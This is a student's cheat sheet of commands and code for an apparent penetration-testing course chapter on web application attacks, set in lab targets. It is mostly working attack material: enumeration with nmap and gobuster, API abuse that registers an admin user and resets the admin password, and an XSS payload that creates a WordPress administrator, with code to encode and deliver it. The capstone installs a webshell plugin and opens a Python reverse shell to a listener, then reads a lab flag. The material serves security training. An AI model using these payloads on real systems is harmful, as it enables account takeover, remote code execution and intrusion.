---
title: "Chapter 8: Introduction to Web Application Attacks - Code"
author: "James Heringer"
course: "PEN-200"
date: 2025-09-21
tags: [Code,CURL,IDOR,DIR,XSS]
description: "the code blocks and terminal commands presented in the chapter 8"
draft: false
layout: cheatsheet
---
# 08_Intro_to_WebApp_Attacks

## **8.2.1. Fingerprinting Web Servers with Nmap**
* we'll rely on the nmap service scan (-sV) to identify the web server (-p80) banner.
```bash
└─$  sudo nmap -p80 -sV 192.168.0.86 

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
```
* enum with nmap script
```bash
sudo nmap -p80 --script=http-enum 192.168.0.86 
PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /test.php: Test page
|   /icons/: Potentially interesting directory w/ listing on 'apache/1.3.20'
|   /manual/: Potentially interesting directory w/ listing on 'apache/1.3.20'
|_  /usage/: Potentially interesting folder
```
* GOBUSTER Brute-Force file extensions
```bash
gobuster -dir -u IP -w WORDLIST -t 40 -x .php,.txt,.html
gobuster dir -u 192.168.0.86 -w /usr/share/wordlists/dirb/common.txt   
gobuster dir -u http://192.168246.189:8080 --proxy http://192.168.246.189:3128 -w /usr/share/wordlists/dirb/common.txt -t 40 -x .php,.txt,.html   # PROXY

feroxbuster -u http://192.168.246.189:8080 -w /usr/share/wordlists/dirb/common.txt --proxy  http://192.168.246.189:3128 -k
```

## 8.3.3. Enumerating and Abusing APIs
* common API paths are api name followed by version number `/api_name/v1`
* We can use GOBUSTER to abuse this information and brute force API endpoints
	1. Create a file with a pattern to be used by go buster, filename ***pattern***
```shell
# pattern, file contents
{GOBUSTER}/v1
{GOBUSTER}/v2
```
2.  gobuster API enumerations
```shell
gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
```
3. Inspect found APIs with curl
```shell
curl -i http://192.168.50.16:5002/users/v1
```
4. Further enumerate found APIs with more bruteforcing from gobuster
```shell
gobuster dir -u http://192.168.50.16:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt
```
5. Inspect found APIs with curl
```shell
# -i instructs curl to include HTTP response headers
curl -i http://192.168.50.16:5002/users/v1/admin/password
```
6. Attempt to  try to convert the above GET request into a POST and provide our payload in the required JSON format
    ```shell
    curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login

    { "status": "fail", "message": "Password is not correct for the given username."}
    ```
    * The API return message shows that the authentication failed, meaning that the API parameters are correctly formed.
	* Try another route and check whether we can register as a new user
    ```shell
    curl -d '{"password":"lab","username":"offsecadmin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/register

    { "status": "fail", "message": "'email' is a required property"}
    ```
	* We need email, but lets also try adding admin key, with value of true 
    ```shell
    curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/register
    {"message": "Successfully registered. Login to receive an auth token.", "status": "success"}
    ```
    * No error recieved, try logging in with login API discovered earlier.
    ```shell
    curl -d '{"password":"lab","username":"offsec"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
    {"auth_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew", "message": "Successfully logged in.", "status": "success"}
    ```
    * Successfull login, and retrieval of  JSON Web Token (JWT) authentication token
    * User token to prove login by changing admin user password
    ```shell
        curl  \
        'http://192.168.50.16:5002/users/v1/admin/password' \
        -H 'Content-Type: application/json' \
        -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew' \
        -d '{"password": "pwned"}'

        {
        "detail": "The method is not allowed for the requested URL.",
        "status": 405,
        "title": "Method Not Allowed",
        "type": "about:blank"
        }
    ```
    * HTTP method is unsupported, so we’ll try an alternative.
    * PUT method (along with PATCH) is often used to replace a value as opposed to creating one via a POST request
    ```shell
        curl -X 'PUT' \
        'http://192.168.50.16:5002/users/v1/admin/password' \
        -H 'Content-Type: application/json' \
        -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' \
        -d '{"password": "pwned"}'    
    ```
    * No error recieved, reattempt login with new password and curl 
    ```shell
    curl -d '{"password":"pwned","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
    {"auth_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzIxMjgsImlhdCI6MTY0OTI3MTgyOCwic3ViIjoiYWRtaW4ifQ.yNgxeIUH0XLElK95TCU88lQSLP6lCl7usZYoZDlUlo0", "message": "Successfully logged in.", "status": "success"}
    ```
7. All curl attempts are easier done in **Burp**
    * Open Burp, **Repeater** tab, create a new empty request.
    ```shell
    POST /users/v1/login HTTP/1.1
    Host: 192.168.50.16:5002
    Content-Type: application/json

    {
        "password": "pwned",
        "username":"admin"
    }
    ```
    * Click **Send** button, and verify incoming response on right pane
	* In Burp **Target** tab and then **Site Map**, we can retrieve entire map of paths we've been testing

	* JavaScript JS example `(<script>alert(42)</script>)`
```javascript
function multiplyValues(x,y) {
  return x * y;
}
 
let a = multiplyValues(3, 5)
console.log(a)
```
## XSS Priv ESC
* Steps to exploit our found XSS and to gain admin access
1. Gather the nonce, the randomness that prevents CSRF
2. craft the main function responsible for creating the new admin user.

```javascript
// gather nonce
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];  // function section to create new admin user
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);  
```
*  above got turned into 
```javascript
var ajaxRequest=new XMLHttpRequest,requestURL="/wp-admin/user-new.php",nonceRegex=/ser" value="([^"]*?)"/g;ajaxRequest.open("GET",requestURL,!1),ajaxRequest.send();var nonceMatch=nonceRegex.exec(ajaxRequest.responseText),nonce=nonceMatch[1],params="action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";(ajaxRequest=new XMLHttpRequest).open("POST",requestURL,!0),ajaxRequest.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),ajaxRequest.send(params);
```

3. PAYLOAD : we need to minify, then encode it
    * minify at https://jscompress.com/
4. Run encoding function in browser dev tools console
```javascript
function encode_to_javascript(string) {
            var input = string
            var output = '';
            for(pos = 0; pos < input.length; pos++) {
                output += input.charCodeAt(pos);
                if(pos != (input.length - 1)) {
                    output += ",";
                }
            }
            return output;
        }
        
let encoded = encode_to_javascript('insert_minified_javascript')
console.log(encoded)
```
5. Take encoded output, 
    * decode string with fromCharCode, 
    * run with eval(),
    * Sent to wordpress with curl (proxied with BURP so we can inspect)
    * 
```shell
curl -i http://offsecwp --user-agent "<script>eval(String.fromCharCode(118,...,...,59))</script>" --proxy 127.0.0.1:8080
```

## 8.5 Capstone
* grabbed WordPress web shell from : https://github.com/p0dalirius/Wordpress-webshell-plugin/blob/master/wp_webshell/wp_webshell.php
* Compressed .php file with zip `zip -r plugin.zip plugin.php`
* Logged into WP as admin, installed the plugin, then activated
* send command as follows
``` bash 
$ curl -X POST 'http://offsecwp/wp-content/plugins/Webshell/Webshell.php?'  --data "action=exec&cmd=id" --proxy 127.0.0.1:8080 
# OUTPUT  {"stdout":"uid=33(www-data) gid=33(www-data) groups=33(www-data)\n","stderr":"" exec":"id"}                                                                                                                                                                                 ```                                    
* in browser `http://offsecwp/wp-content/plugins/Webshell/Webshell.php?action=exec&cmd=id`
* started Kali NC listener `nc -nvlp 4444`
* executed the following python code in webshell, and got a call back

```python
# https://www.revshells.com/, Python #2
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.190",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'

# IN Browser 
http://offsecwp/wp-content/plugins/Webshell/Webshell.php?action=exec&cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.45.190%22,4444));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22sh%22)%27
```

### FLAG
* Grabbed flag from /tmp/flag `cat /tmp/flag`   OS{d47eec32a0a5ee0d4944db1646f19ca0}
